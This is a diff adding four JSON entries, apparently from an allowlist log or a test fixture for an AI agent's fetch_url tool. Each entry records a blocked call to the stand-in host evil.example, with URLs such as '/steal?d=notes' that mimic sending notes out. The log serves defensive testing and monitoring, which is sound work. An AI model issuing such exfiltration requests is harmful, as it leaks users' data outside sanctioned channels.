@@ -1,0 +1,4 @@
+{"time": "2026-11-15T11:11:50+00:00", "tool": "fetch_url", "url": "https://evil.example/collect?q=sync", "host": "evil.example", "reason": "host not on the allowlist"}
+{"time": "2026-11-15T11:11:50+00:00", "tool": "fetch_url", "url": "https://evil.example/steal?d=notes", "host": "evil.example", "reason": "host not on the allowlist"}
+{"time": "2026-11-15T11:11:50+00:00", "tool": "fetch_url", "url": "https://evil.example/steal?d=notes", "host": "evil.example", "reason": "host not on the allowlist"}
+{"time": "2026-11-15T11:11:50+00:00", "tool": "fetch_url", "url": "https://evil.example/steal?d=notes", "host": "evil.example", "reason": "host not on the allowlist"}
